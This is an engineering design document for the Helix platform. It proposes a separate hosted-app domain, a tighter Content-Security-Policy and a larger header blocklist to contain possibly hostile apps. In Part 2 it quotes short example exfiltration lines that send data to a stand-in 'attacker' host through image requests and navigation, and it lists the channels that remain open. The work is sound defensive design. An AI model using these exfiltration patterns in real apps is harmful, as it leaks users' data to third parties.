# Hosted-app containment: a separate app domain and a tighter CSP

_Problem:_ Problem 2 in [00-frame.md](./00-frame.md) ("hosted apps are not fully contained"). _Findings:_ SEC-1, SEC-2, SEC-13 ([07-security.md](../../explore/helix-repo-exploration/notes/07-security.md)); KP-1, KP-9 ([04-known-problems.md](../../explore/helix-repo-exploration/notes/04-known-problems.md)); upstream issue #16.

_Repository:_ `projects/helix` at `main` = 792557a. Paths below are relative to it. Anything I inferred but did not open is marked **Hypothesis**.

## Summary

Decisions D1 (authors may be hostile), C1 to C6, V1, V2 and V4 are applied. Both parts ship, in an order that puts the least risky change first. Each stricter behavior is a per-install setting, so an install on AZX's documented model (one org per install, ADR-0028) can relax it.

**Part 3 (first, separable).** Add `clear-site-data`, `content-security-policy`, `content-security-policy-report-only`, `refresh`, `report-to`, `reporting-endpoints`, `nel` and `link` to the shared proxied-response header blocklist (SEC-13).

**Part 2 (next).** Change `img-src` from `https:` to `'self' data: blob:` plus approved origins, reusing the `externalOrigins` approval and the Violations screen, and add `object-src 'none'`. It lands as a `Content-Security-Policy-Report-Only` header first, then the enforced header switches. A per-install `EDGE_IMG_SRC_ALLOW_ALL` setting restores today's `https:` for installs that accept the channel. Top-level navigation, popups, WebRTC and DNS hints cannot be closed by any CSP, `sandbox` or COOP option I found. After Part 2, an app that wants to leak what its viewer can read still can. Part 2 removes the silent, no-gesture, bulk channel. It does not deliver confidentiality, and the docs must say so.

**Part 1 (last, because it touches the OIDC handoff).** Add an optional second domain for hosted apps. Apps move to the new domain, and `auth.`, `portal.` and `dev-api.` stay where they are. Because the auth host does not move, Entra redirect URIs, vendor OAuth callback URLs and the portal SPA stay unchanged, and an install that sets nothing behaves exactly as today. The edge gets a `controlDomain` beside `baseDomain`, and every call site that builds an auth-host URL goes through one `controlOrigin()` helper. The portal gets one new optional env var. Certbot and DNS are instantiated once per domain, with no script changes. No specific domain is chosen (C1): the split is per-install configuration. It is tested locally only (V2), with a second loopback domain in the dev environment. Azure behavior is compile-checked and labeled **unverified in Azure** (V4).

Nothing is rolled out to the two live installs by this work. The deliverable is code, tests and **operator rollout notes** (see Rollout and migration).

## Current behavior

### One domain for apps, auth, portal and dev-api

- **Edge config.** `GatewayConfig.baseDomain` is the only domain setting (`apps/edge/src/config.ts:115-116`), read from `EDGE_BASE_DOMAIN` (`config.ts:745`). The dev-gateway shares the same field because it extends `GatewayConfig`.
- **Host classification.** `classifyHost(hostHeader, baseDomain)` strips the port, requires the host to end in `.<baseDomain>`, returns `auth` when the label is exactly `auth`, and otherwise requires exactly one label that matches `SLUG_PATTERN` and is not in `RESERVED_SUBDOMAINS` (`auth`, `portal`, `api`, `www`) (`apps/edge/src/routing/hosts.ts:17-43`). It is called once, in the `onRequest` hook (`apps/edge/src/app.ts:370-373`). The final catch-all route 404s every non-app host (`app.ts:806-818`).
- **URL builder.** `publicOrigin(config, label | null)` builds `<scheme>://<label>.<baseDomain>[:port]` (`config.ts:897-901`). The same function builds app origins and the auth origin, with `"auth"` passed as if it were a slug. Auth-host call sites:
  - `apps/edge/src/server.ts:131` (OIDC redirect URI)
  - `apps/edge/src/auth/gate.ts:181` (`/start` redirect)
  - `apps/edge/src/auth/routes/authHost.ts:153, 163` (callback URL, silent-refresh restart)
  - `apps/edge/src/auth/routes/passwordLogin.ts:61`
  - `apps/edge/src/routing/consentStart.ts:320` and `apps/edge/src/devGateway/consentStart.ts:170, 211` (vendor callback, popup URL)
  - `apps/edge/src/serving/assets.ts:203` (connect-helper `platformOrigins`)
- **App-origin call sites** (these stay `publicOrigin`): `authHost.ts:204` (handoff redirect target), `gate.ts:204` (password login), `validate.ts:88` (Origin check), `consentStart.ts:246`, `assets.ts:203`.
- **Bicep.** `appsDomain` is one parameter (`infra/azure/main.bicep:55`). It feeds:
  - the availability probe `https://auth.${appsDomain}/health` (`main.bicep:886-902`);
  - the wildcard cert name (`main.bicep:1120`);
  - the edge's declared custom domain `*.${appsDomain}` (`main.bicep:1144`);
  - `EDGE_BASE_DOMAIN` on the edge and the dev-gateway (`main.bicep:1197, 1433`);
  - the portal binding `portal.${appsDomain}` (`main.bicep:1272`);
  - the portal env `APP_PUBLIC_BASE` and `DEV_API_PUBLIC_BASE` (`main.bicep:1334-1339`);
  - the dev-gateway binding `dev-api.${appsDomain}` (`main.bicep:1396`);
  - the `dns` and `certbot` modules (`main.bicep:1468, 1490`).
- **DNS.** One zone named `appsDomain` holds `*`, `auth`, `portal`, `dev-api` (when deployed) and the `asuid` TXT record (`infra/azure/modules/dns.bicep:31-97`).
- **Certbot.** One job issues `*.<APPS_DOMAIN>` plus the apex from one zone (`apps/certbot/issue-and-bind.sh:105, 117`). It binds `*.<APPS_DOMAIN>` on the edge (`issue-and-bind.sh:142-146`) and binds `portal.` and `dev-api.` on their own apps with the same cert (`issue-and-bind.sh:167-178`). The module injects `PORTAL_HOSTNAME`/`DEV_GATEWAY_HOSTNAME` as `portal.${appsDomain}`/`dev-api.${appsDomain}` (`infra/azure/modules/certbot.bicep:190-192`). The cert store name is `wildcard-<dashes>` (`certbot.bicep:41`, `main.bicep:1120`), single-sourced per ADR-0044.
- **Entra.** The edge redirect URI is `https://auth.azx.helix.azxlabs.io/callback`, the SPA's is `https://portal.azx.helix.azxlabs.io/auth/callback` (`infra/entra/main.bicepparam:12-13`, `infra/entra/main.bicep:30-37`).
- **Portal.** `APP_PUBLIC_BASE` gives the apps origin. `appPublicUrl(slug)` builds each app's `url` from it (`apps/portal/src/deployment.ts:28-56`). `GET /api/v1/config` returns `appPublicBase` from the same function (`apps/portal/src/routes/config.ts:26-29`). The SPA reads that value and derives nothing (`apps/portal-web/src/lib/deployment.ts:51-65`). The vendor OAuth callback URL is **derived** as `auth.<APP_PUBLIC_BASE host>` + `/connections/callback` (`deployment.ts:72-75`), and the comment at `deployment.ts:66-68` argues against a second auth-base field. Admins register this URL with vendors (`apps/portal/src/connections/completion.ts:410`, `routes/providers.ts:514`).
- **Availability probes.** The only platform health URL that answers is `auth.<appsDomain>/health`. `/health` on an app host serves app content by design (`alerts-availability.bicep:17-19`, `infra/azure/README.md:966-976`).
- **Dev container.** `EDGE_BASE_DOMAIN: local.helix.azxlabs.io` (`.devcontainer/docker-compose.yml:90`). mkcert issues `*.local.helix.azxlabs.io` and `local.helix.azxlabs.io` (`.devcontainer/post-create.sh:51-55`). `*.local.helix.azxlabs.io` is a platform-owned DNS wildcard that resolves to 127.0.0.1.
- **Hardcoded hosts in tests and tooling.**
  - Edge unit tests via `testEdgeConfig` and `testDevGatewayConfig` (`apps/edge/src/test/config.ts:59, 115`) and `routing/hosts.test.ts` (`BASE` constant).
  - `apps/edge/src/config.test.ts:662-667`, which asserts `publicOrigin(prod, null)`.
  - `apps/connections-lane/src/world.ts:74` (`AUTH_HOST`).
  - `scripts/stack-env.mjs:53, 81-92` and `.claude/skills/run-helix/smoke.mjs:95, 468, 557`.
  - `.github/workflows/ci.yml:176`.
  - The portal tests in `apps/portal/src/deployment.test.ts:79-95`.

### What the auth flow does across hosts today

The flow is described in `docs/features/authentication.md` (steps 1-3) and implemented in `apps/edge/src/auth/routes/authHost.ts`.

- `/start` on the auth host sets the signed `__Host-oidc-flow` cookie on the auth host and redirects to the IdP.
- `/callback` on the auth host reads that cookie, exchanges the code, creates a pending session row and redirects to `<slug>.<base>/_auth/complete?token=…` (`authHost.ts:204-217`).
- The app host redeems the token atomically and sets `__Host-session` on the app host.
- Both hops are already cross-**origin**. They become cross-**site** after Part 1. The cookies are host-only (`__Host-`, no `Domain`), so their scope does not change.
- The Origin and Fetch Metadata guard accepts only `same-origin` (`apps/edge/src/auth/validate.ts:72-90, 130-146, 167-191`). `same-site` and `cross-site` are both refused, so a sibling app moving from `same-site` to `cross-site` changes nothing.
- The consent popup posts to `window.opener` with a config-derived target origin (`apps/edge/src/serving/consentPages.ts:58`). The receivers check `event.origin` against `[appOrigin, authOrigin]` (`assets.ts:203`).

### CSP

`buildAppCsp(externalOrigins)` (`apps/edge/src/serving/csp.ts:60-77`) emits:

- `default-src 'self'`
- `script-src 'self' 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval'` + five CDNs (`csp.ts:23-29, 65`)
- `img-src https: data: blob:` + approved origins (`csp.ts:68`)
- `connect-src 'self'` + approved origins
- `form-action 'self'`, `frame-ancestors 'none'`, `base-uri 'self'`, `worker-src 'self' blob:`, `media-src 'self' data: blob:`
- `report-uri /_csp-report`

Nothing sets `object-src`, so it falls back to `default-src 'self'` (ADR-0009 open question). `frame-src`/`child-src` also fall back to `default-src`, so hidden iframes to other hosts are already blocked.

The same string is used in two places: asset responses (`apps/edge/src/serving/assets.ts:114`) and the platform service-worker script (`apps/edge/src/app.ts:791`).

**How approved origins reach the CSP:**

1. The owner submits a manifest with `capabilities.externalOrigins` (`packages/shared/src/manifest.ts:314`, `z.array(z.url())`) or uses the one-click `POST /api/v1/apps/:slug/access/origin` (`apps/portal/src/routes/apps.ts:344-380`).
2. `applyCapabilityChange` classifies the diff. Every added origin is `risk: "med"` and elevated (`packages/shared/src/approval.ts:406-410`), so it opens an approval request. Removals are low and apply immediately.
3. Once approved, the effective capabilities are written. The edge registry projection reads them with `parseExternalOrigins`, which fails closed to `[]` (`apps/edge/src/registry/projection.ts:161-164, 504`).
4. `originSources` reduces each to `new URL().origin` and drops anything that parses to `"null"` (`csp.ts:41-52`).

The Violations screen already exists. The edge records CSP reports into `csp_reports` (INSERT-only, `apps/edge/src/serving/cspReport.ts:34-57`). The portal marks a violation resolved when the blocked origin is in `externalOrigins` and the directive is `connect-src` or `img-src` (`apps/portal/src/db/mappers.ts:193-215`). The approval-screen copy for an origin grant says "direct browser calls" and does not mention images (`packages/shared/src/capabilityHelp.ts:61-70`).

The edge emits no metric for CSP reports. `docs/features/observability.md` has none for them either (grep for "csp" in that file returned nothing).

## Goals and non-goals

**Goals**

1. A per-install option to serve hosted apps on a registrable domain that the portal, auth host and dev-api do not share. This closes the cookie-bomb DoS against the control hosts and the reputation blast radius (SEC-1, KP-1, #16).
2. The single-domain layout keeps working with zero changes for installs that do not opt in.
3. Remove the silent, bulk, no-gesture image channel (SEC-2). Give app owners a working path for legitimate remote images through the existing approval flow.
4. Say plainly which channels stay open.
5. Every stricter behavior is a per-install setting that an operator can relax.

**Non-goals**

- Choosing, registering or delegating any domain (C1).
- Rolling anything out to the live installs. This work has no access to them (D2 revised).
- Per-app vanity domains (ADR-0028 decision 1 rejects them).
- Moving the auth host, portal or dev-api. Doing so would change Entra redirect URIs and the OAuth callback URLs that admins registered with vendors.
- Sandboxed iframes (ADR-0019 already rejected them).
- Closing top-level navigation, WebRTC and DNS hints. No CSP mechanism does this.
- Narrowing the CDN script list or adding a per-app `scriptOrigins` capability (C6). Separate decision.
- A dedicated `imageOrigins` capability (C3). Decide from the Report-Only data.
- PSL submission. That is a per-deployment customer action (ADR-0019 amendment, ADR-0028 decision 2).

## Options

### Part 1: where hosted apps are served

#### Option 1C (chosen): keep the existing domain as the "control" domain and add an optional separate apps domain

New edge setting `EDGE_CONTROL_DOMAIN`. Default: the value of `EDGE_BASE_DOMAIN`, which is today's behavior exactly.

- `EDGE_BASE_DOMAIN` keeps its meaning: apps serve on `<slug>.<EDGE_BASE_DOMAIN>`.
- `auth.<EDGE_CONTROL_DOMAIN>` is the auth host. `portal.` and `dev-api.` are placed there by Bicep.
- ADR-0028 already uses "control-plane base" for `dev-api` (Consequences, "The dev tier is per-instance"), so the term fits.

**How it works at the edge**

- `classifyHost(host, baseDomain, controlDomain = baseDomain)` gains an optional third argument, so every existing call and test is unchanged.
- It returns `auth` only when the host equals `auth.<controlDomain>`.
- Under the apps suffix it classifies as today, with `RESERVED_SUBDOMAINS` still applied. In split mode `auth.<appsDomain>` is therefore `platform` and is never an auth host. This is the property the adversarial test must pin.
- `publicOrigin(config, slug)` stays the app-origin builder. A new `controlOrigin(config, "auth" | "portal" | "dev-api")` builds the control origins. `publicOrigin` throws if given a reserved label, so an unmigrated call site cannot silently emit `auth.<appsDomain>`. It fails at the first call, in tests, rather than as a wrong redirect in production.
- The eight auth-host call sites listed above move to `controlOrigin`. Call sites that build app origins do not change.

**Boot validation (fail closed)**

- `controlDomain` must be a valid hostname.
- `controlDomain` must not be equal to, a subdomain of, or a parent of `baseDomain`, unless the two are equal (legacy single-domain mode).
- If `controlDomain` were a subdomain of the apps domain, an app could set `Domain=` cookies that reach the control hosts. That would defeat the purpose.
- A parent/child relationship the other way (e.g. apps on `apps.helix.customer.com`, control on `helix.customer.com`) is the delegated-subdomain case ADR-0028 allows. It is only same-site separated if the customer PSL-lists the apps zone. The edge cannot check PSL membership without a new dependency, so it only logs `boot.serving` with `split: true` and the two domains. The operator documentation states the PSL requirement. I propose rejecting only identical, and subdomain-of-apps, configs at boot.

**Optional grace-period redirect for existing URLs**

With a new setting `EDGE_LEGACY_APP_REDIRECT` (default off), a request to `<slug>.<controlDomain>` for a registered, non-archived app gets a `307` to the same path on the new app origin.

- **GET/HEAD only.** Paths beginning with `_` are never redirected, so `/_auth/*` and `/_api/*` cannot be used to move a token or a credentialed request to another host.
- **Open-redirect safety.** The target is built from config, a registry-validated slug and a path normalised by the existing `validateReturnPath` (`apps/edge/src/auth/validate.ts`).
- **No distinguishing unknown apps.** Unknown and archived slugs get the normal 404.
- **No session transfer.** Visitors sign in again on the new host. SSO makes that a redirect round trip.
- **Cache headers.** `cache-control: no-store` until the owner is sure of the destination. I would not use a permanent redirect during rollout, because browsers cache 301/308 and a rollback would break.
- **Cost of the grace period.** The control domain keeps a wildcard DNS record and wildcard cert while the redirect is on. The wildcard on the control domain serves only 3xx and 404 responses, so it does not host app content and does not reopen the cookie-bomb path. It is turned off at sunset.

**Portal**

- A new optional env `CONTROL_PUBLIC_BASE` (scheme, host, port; defaults to `APP_PUBLIC_BASE`'s origin).
- `connectionsCallbackUrl()` uses it: `<controlBase>/connections/callback` with host `auth.<controlHost>`.
- Because the portal cannot derive the auth host once apps leave the control domain, this amends the "derived, never configured" rule in `deployment.ts:66-68`. The rule existed to prevent drift between the edge and portal. The replacement is a boot-time consistency check (see Tests and ADR impact) and the Bicep that sets both variables from one parameter.
- `APP_PUBLIC_BASE` becomes the apps origin. `appPublicUrl()` and `GET /api/v1/config` need no code change. `appPublicBase` is already what the SPA uses, and it stays the only source (AGENTS.md: "Never reintroduce a `VITE_*` domain var or derive the apps host from `window.location`").
- `assertDeploymentConfig` (`deployment.ts:130-134`) validates `CONTROL_PUBLIC_BASE` the same way it validates `DEV_API_PUBLIC_BASE`.

**Infra**

- New Bicep parameter `hostedAppsDomain` (default `''` meaning "same as `appsDomain`"). `appsDomain` keeps its current meaning, which becomes the control domain when `hostedAppsDomain` is set. This choice keeps every existing `.bicepparam` valid. The cost is a name that reads backwards for new installs, which the docs must explain.
- Derived variables in `main.bicep`: `appHostsDomain = empty(hostedAppsDomain) ? appsDomain : hostedAppsDomain`.
- Edge env: `EDGE_BASE_DOMAIN = appHostsDomain`, `EDGE_CONTROL_DOMAIN = appsDomain`. The dev-gateway gets the same two values (its popup URL uses the auth host).
- Portal env: `APP_PUBLIC_BASE = https://${appHostsDomain}`, `CONTROL_PUBLIC_BASE = https://${appsDomain}`, `DEV_API_PUBLIC_BASE` unchanged.
- Availability probe URL stays `https://auth.${appsDomain}/health`. No change is needed for the existing domain. The probe stays correct because it is keyed to the control domain, and the edge answers platform `/health` only on non-app hosts.
- DNS: `dns.bicep` is instantiated twice. The control zone keeps `*` (while the grace redirect is on), `auth`, `portal`, `dev-api`, `asuid`. The apps zone gets only `*` and `asuid`. A new `hostsControlPlane` bool parameter selects the record set.
- Certbot: **no script change.** `issue-and-bind.sh` is already parameterised by `APPS_DOMAIN`, `CERT_NAME`, `EDGE_APP`, `PORTAL_APP` and `DEV_GATEWAY_APP`. Instantiate the `certbot` module twice.
  - The existing instance keeps its cert name (derived from the control domain, so the live installs' name does not change) and keeps the portal and dev-gateway bindings.
  - A second instance for the apps domain passes `portalAppName = ''` and `devGatewayAppName = ''`. It issues `*.<hostedAppsDomain>` and binds it on the edge.
  - The ADR-0044 invariant stays true per cert: each cert name is computed once in `main.bicep` and passed to both the job and the declarative binding.
- Edge `customDomains` gets two entries (`*.<control>` with the control cert and `*.<apps>` with the apps cert). A second gate parameter `hostedAppsTlsBound` (default false) is flipped after the second certbot run, for the same reason ADR-0044 introduced `wildcardTlsBound`: a declarative binding to a cert that does not exist fails the PUT.
- **Hypothesis, unverified in Azure:** ACA allows two wildcard custom domains on different certs on one container app. I did not check the ACA limits and nothing local can.


**Cross-site behavior and what local testing can prove (V2)**

- The handoff 302 chain becomes a cross-site top-level navigation. `SameSite=Lax` does not block it. The cookie is set by the response to that navigation (so it is first-party at the time it is stored), and the next top-level GET to the app sends it.
- **Hypothesis:** Safari ITP, Firefox ETP and Chrome bounce-tracking mitigations treat an auth host that redirects without user interaction as a bounce tracker and may clear its storage. The flow cookie is already burned after one use and the auth host holds no durable state for the browser, so I expect no break, but it is not tested. Silent refresh (`/start?silent=1`) is the same pattern at higher frequency. These heuristics depend on tracker classification lists, user interaction history and real domains, so a loopback domain cannot prove them. This stays **unverified** and goes into the operator rollout notes as a check to run on a real split install in Safari, Firefox and Chrome before moving apps.

**Second loopback domain in the dev environment**

The dev stack serves everything under `local.helix.azxlabs.io`, a platform-owned wildcard that resolves to 127.0.0.1 (`docker-compose.yml:86-90`). A second name under `azxlabs.io` would be same-site with it. For a pair that browsers classify as cross-site, use a name under the `.localhost` TLD for the apps domain and keep `local.helix.azxlabs.io` as the control domain:

- Control domain: `local.helix.azxlabs.io` (unchanged). Apps domain: `helix-apps.localhost`, so apps are `<slug>.helix-apps.localhost`. The registrable domains differ (`azxlabs.io` against `helix-apps.localhost`). **Hypothesis:** browsers treat the unlisted `localhost` TLD with the implicit `*` PSL rule, so `a.localhost` and `b.localhost` are different sites. CT-7 includes a browser check that reads `Sec-Fetch-Site` on the handoff and the app's `/_api` calls and records the actual value. If a browser reports `same-site`, the phase falls back to the pair below.
- **Name resolution, browser.** Chromium and Firefox resolve `*.localhost` to loopback themselves. The smoke runner's browser is launched with `--host-resolver-rules="MAP *.helix-apps.localhost 127.0.0.1"` so it does not depend on that. Safari handling of `*.localhost` is **unverified**.
- **Name resolution, Node.** The smoke runner's HTTP client and `scripts/stack-env.mjs` use an undici agent whose `connect.lookup` maps any name ending in `.helix-apps.localhost` to 127.0.0.1. glibc does not resolve arbitrary `*.localhost` names, so the runner does not rely on `getaddrinfo`.
- **Certificate.** `.devcontainer/post-create.sh:51-55` skips mkcert when `local-helix.pem` exists, so existing dev containers would never pick up new names. Add a second guarded block that writes `local-helix-split.pem` / `-key.pem` with SANs `*.local.helix.azxlabs.io`, `local.helix.azxlabs.io`, `*.helix-apps.localhost`, `helix-apps.localhost`. Compose selects it through `EDGE_TLS_CERT_FILE` only when `HELIX_APPS_DOMAIN` is set. **Hypothesis:** mkcert accepts these names and Chromium accepts a wildcard under `.localhost`; verify during CT-4.
- **Switch.** One env var, `HELIX_APPS_DOMAIN` (unset = single-domain dev, today's behavior). When set, `docker-compose.yml` passes `EDGE_BASE_DOMAIN=$HELIX_APPS_DOMAIN`, `EDGE_CONTROL_DOMAIN=local.helix.azxlabs.io`, and the portal's `APP_PUBLIC_BASE`/`CONTROL_PUBLIC_BASE`. `scripts/stack-env.mjs` exposes both domains to the smoke runner.
- **Same-site fallback pair.** `apps.local.helix.azxlabs.io` (apps) with control `local.helix.azxlabs.io` is the delegated-subdomain-without-PSL case. It runs the host-routing, origin-check and boot-validation tests. It is expected to be same-site, which is exactly what the operator documentation warns about, so it also serves as a negative control for the cookie-scope tests.

**What local testing can prove**

- Host classification, redirect `Location` targets, host-only cookie scope and Origin / Fetch Metadata refusal across two real hostnames in a real browser (Chromium; Firefox and WebKit through the Playwright engines if the smoke runner already drives them, otherwise Chromium only).
- That the handoff chain completes as a cross-site top-level navigation with `SameSite=Lax` in Chromium, including silent refresh and the concurrent-redeem race.
- That an app cannot set a cookie that reaches the control hosts: a `Domain=` attribute covering the control host, or covering `localhost`, is rejected or never sent to `auth.local.helix.azxlabs.io`.
- That the old single-domain tests pass unmodified.

**What it cannot prove**

- Behavior with a real PSL entry, a real customer zone or real DNS delegation. A customer's delegated subdomain without a PSL entry is same-site, and only the same-site fallback pair exercises that.
- Safari ITP, Firefox ETP and Chrome bounce-tracking behavior on real domains (see the Hypothesis above). Playwright's WebKit is not Safari.
- Real certificate issuance, wildcard bindings and the two-cert layout on Azure Container Apps. These are **unverified in Azure**; Bicep is only compile-checked.
- Cookie-bomb 431 behavior against the real ingress limits in Azure. The local edge can show that control hosts do not receive app-host cookies, but not Azure's header-size limits.

**Pros:** fixes SEC-1 and KP-1 where the leverage is, moves only the hosts that hold untrusted content, no vendor or IdP re-registration, default-off.
**Cons:** two certs, two zones, and one more config variable on three services. The ACA wildcard bindings and two cert jobs cost operator attention. Which domains to use is per-install configuration (C1); this work names none.

### Part 2: closing exfiltration channels

The channel inventory is the same for every option, so the options differ in what they close. The "remaining open" list is stated for the chosen option.

#### Option 2B (chosen): tighten `img-src`, add `object-src 'none'`, use Report-Only first

1. `img-src 'self' data: blob:` + `originSources(externalOrigins)`. The grant path is the existing `externalOrigins` approval and the existing one-click grant from Violations.
2. Add `object-src 'none'` (ADR-0009 open question; cheap; breaks only `<object>`/`<embed>` content, which static generated apps rarely use. **Hypothesis**: I did not measure usage).
3. Roll out in two steps. First emit a second header `Content-Security-Policy-Report-Only` with the tightened policy while the enforced policy stays as today. Browsers send report-only violations to the same `report-uri`, so the edge records them in `csp_reports` without breaking anything. After the measurement window, switch the enforced header.
4. Compatibility cost:
   - Images from unsplash, picsum, placeholder services, avatar hosts and icon CDNs stop loading until the owner requests the origin.
   - Each grant is an elevated, admin-approved request (`approval.ts:406-410`). That is heavy for a harmless image host.
   - Approving an origin for an image also grants `connect-src` to it, because both directives are widened by the same list (`csp.ts:68-70`).
   - The approval copy ("Direct browser calls") does not say that an approved host is also an image sink (`capabilityHelp.ts:61-70`) and must change.
5. Mitigation for the approval cost: an operator-level `EDGE_IMG_SRC_EXTRA` (comma-separated origins, default empty) appended to every app's `img-src` only. An install can allow hosts it trusts without a per-app request. It must not list hosts that proxy or fetch attacker-chosen URLs (image proxies), because those are sinks.
6. Per-install relaxation: `EDGE_IMG_SRC_ALLOW_ALL` (default `false`) puts the `https:` source back in `img-src` and suppresses the Report-Only duplicate. It is for installs on the one-org model that accept the channel. The default stays tight (C2).

**Remaining open under 2B:**

- **Top-level navigation** (`location.href = "https://attacker/?d=…"`). `form-action 'self'` covers forms only. `navigate-to` was never shipped in browsers, so CSP cannot govern navigation.
- **Popups and `window.open`** (needs a user gesture in most browsers, which attackers can get from a click the app already offers).
- **Any approved origin.** `connect-src` and (now) `img-src` grants are exfil sinks by design.
- **WebRTC ICE to attacker STUN/TURN servers.** **Hypothesis:** CSP `connect-src` does not govern ICE in current Chrome; not tested here.
- **DNS prefetch and preconnect hints** (`<link rel=dns-prefetch>`). **Hypothesis:** not governed by `img-src`/`connect-src`; low bandwidth; not tested.
- **Request URLs to permitted CDN hosts** (script, style and font URLs carry data to the CDN). The attacker only benefits if they can observe that CDN's logs or per-URL behaviour. I do not know of such a case, which is a **Hypothesis**.

2B removes the channel that needs no user gesture, no visible page change and no attacker-hosted page: `new Image().src = "https://attacker/…?d=…"` in a loop. Navigation is visible, destroys the page unless the attacker bounces back with a redirect, and often needs a gesture.

### Part 3 (first, small, separable): proxied response headers (SEC-13)

`RESPONSE_HEADER_BLOCKLIST` (`packages/shared/src/fetch.ts:110-122`) is a denylist of 11 names. It is the single source for egress (`apps/egress/src/proxy.ts:79, 666-676`) and the edge gateway (`apps/edge/src/gateway/fetch.ts:405-407`). So `clear-site-data`, `content-security-policy`, `refresh`, `report-to`, `reporting-endpoints`, `nel` and `link` are copied from the upstream onto the app-origin response.

- `refresh` is moot on a `fetch()` response, and navigations are refused outright (`validate.ts:136-148`).
- **Hypothesis:** `Clear-Site-Data` on a fetch response executes against the app origin and could wipe its cookies and storage, including `__Host-session`. This needs an approved origin that returns it, so it is a Low-severity DoS by a vendor; I did not test it.
- **Chosen:** add these names to the blocklist now (one-line change with a unit test in `fetch.test.ts` or the existing blocklist tests). An allowlist is the better end state (the finding's recommendation), but it can drop headers apps rely on (`etag`, `content-type`, `retry-after`, rate-limit headers) and deserves its own review.

## Options not chosen

- **1A, do nothing and document the residual.** Rejected by D1. Authors may be hostile, so SEC-1 stays High and the cost of moving rises with every committed customer URL. An install on the one-org model can simply leave `EDGE_CONTROL_DOMAIN` unset.
- **1B, move every host to a new domain.** Moves `auth.`, `portal.` and `dev-api.` too, which changes the Entra edge and SPA redirect URIs (`infra/entra/main.bicepparam:12-13`), every vendor OAuth callback admins registered, the dev-api CORS and token origins, and the portal URL users have bookmarked.
- **2A, do nothing and document the residual.** Rejected by D1. It leaves the silent bulk image channel open for every install.
- **2C, a dedicated `imageOrigins` capability.** Deferred by C3. It is a manifest-schema change under ADR-0028's version-skew cost (`manifest.ts:314`, `approval.ts`, `catalogue.ts:162`, `mappers.ts:193-215`, `projection.ts:161`, the SPA, the deploy skill). Revisit with the Report-Only data.
- **2D, the `sandbox` CSP directive.** It does not stop a top-level document navigating itself (**Hypothesis**, not verified in a browser), and every `allow-*` combination that keeps `__Host-` cookies, `/_api/*` and the consent popup working reopens the popup channel (ADR-0014, ADR-0019).
- **2E, Cross-Origin-Opener-Policy.** It governs window references, not outbound requests or navigation, so it closes no exfil channel. `same-origin` would sever `window.opener` for the consent popup (`consentPages.ts:58`). `same-origin-allow-popups` is possible later XS-leak hardening with its own browser test.
- **2F, narrow the CDN script list.** Rejected for this change (C6). It does not close an exfil channel because the author already controls inline script, and removing `esm.sh`, `unpkg.com` or `cdn.jsdelivr.net` breaks many generated apps with no per-origin escape hatch. A per-app `scriptOrigins` capability (ADR-0009 open question) needs its own decision.
- **Allowlist for proxied response headers.** Better end state than the denylist, but it can drop headers apps rely on (`etag`, `content-type`, `retry-after`, rate-limit headers). It needs its own review and is not part of this change.

## Recommendation

Ship in this order, each as its own change (see Work breakdown):

1. **Part 3**: extend the proxied-response header blocklist.
2. **Part 2, Report-Only**: tightened `img-src` plus `object-src 'none'` as `Content-Security-Policy-Report-Only`, the report counter, `EDGE_IMG_SRC_EXTRA`, approval copy, skill and docs updates.
3. **Part 2, enforcement**: switch the enforced header, with `EDGE_IMG_SRC_ALLOW_ALL` (default false) as the per-install relaxation.
4. **Part 1: Option 1C**, last. It fixes SEC-1/KP-1 without touching the IdP registration, the vendor callbacks or the portal URL, it defaults to today's behavior, and each Bicep piece reuses an existing module. The first test for any change to a host-keyed boundary is that the old layout still passes the old tests unmodified. 1C passes because `controlDomain` defaults to `baseDomain` and `classifyHost` takes a defaulted third argument. It lands last because it touches the OIDC handoff and carries the dedicated adversarial-test review pass (AGENTS.md).

**How the decisions apply:**

- **D1 (possibly hostile).** Both parts ship. Customer docs state that app code can exfiltrate any data its viewer can read through navigation even after Part 2. The unit of trust is which data sources an app may be granted, not the CSP.
- **D2 (revised).** No live-install rollout. Rollout sections become operator rollout notes.
- **C1.** No domain is named anywhere in code defaults. `hostedAppsDomain` and `EDGE_BASE_DOMAIN`/`EDGE_CONTROL_DOMAIN` are per-install configuration.
- **C2.** Default-tight `img-src` after a Report-Only window, with the approval path and `EDGE_IMG_SRC_EXTRA`.
- **C3.** No `imageOrigins` capability.
- **C4.** The legacy redirect ships, default off, with a sunset keyed on `INSTR_LEGACY_APP_REDIRECTS` reaching zero.
- **C5.** The second dev domain ships in the dev environment (see the loopback section).
- **C6.** The CDN list is unchanged.
- **V1, V4.** Everything is proven with `./check-and-lint.sh` / `just check` in the dev container, and the smoke runner (`node .claude/skills/run-helix/smoke.mjs`, `just dev smoke`) where running services change. Azure-only claims are labeled **unverified in Azure**.

## Change by file

| File | Change | Notes |
| --- | --- | --- |
| `apps/edge/src/config.ts` | Add `controlDomain` to `GatewayConfig`, read `EDGE_CONTROL_DOMAIN` (default `baseDomain`), add boot validation, add `controlOrigin()`, make `publicOrigin()` refuse reserved labels, read `EDGE_LEGACY_APP_REDIRECT`, read `EDGE_IMG_SRC_EXTRA`, read `EDGE_IMG_SRC_ALLOW_ALL` | Near `config.ts:115, 745, 897`. Dev-gateway inherits via `GatewayConfig`. Fail at boot on a bad domain pair. |
| `apps/edge/src/routing/hosts.ts` | `classifyHost(host, baseDomain, controlDomain = baseDomain)`; `auth` only for `auth.<controlDomain>`; optional `legacy-app` kind for `<slug>.<controlDomain>` when the redirect is enabled | Keep `RESERVED_SUBDOMAINS` for the apps suffix. Unknown kinds fall through to the 404 catch-all (`app.ts:806-818`). |
| `apps/edge/src/app.ts` | Pass `config.controlDomain` at `:372`; in the catch-all route add the legacy redirect branch; add the `Content-Security-Policy-Report-Only` header next to the enforced CSP at `:791` | The redirect branch uses `validateReturnPath` and `registry.getApp`. |
| `apps/edge/src/server.ts`, `auth/gate.ts`, `auth/routes/authHost.ts`, `auth/routes/passwordLogin.ts`, `routing/consentStart.ts`, `devGateway/consentStart.ts`, `serving/assets.ts` | Replace `publicOrigin(config, "auth")` with `controlOrigin(config, "auth")` | 8 sites; lines listed in Current behavior. App-origin sites stay on `publicOrigin`. |
| `apps/edge/src/devGateway/server.ts` | Log `controlDomain` in `boot.serving` | `:210`. |
| `apps/edge/src/serving/csp.ts` | `img-src 'self' data: blob:` + origins + `EDGE_IMG_SRC_EXTRA` (or `https:` when `EDGE_IMG_SRC_ALLOW_ALL`); add `object-src 'none'`; export a function that builds the Report-Only variant | Update the module comment (`csp.ts:7-12`) so it states what is and is not closed. Keep `unsafe-inline` (ADR-0009, ADR-0035). |
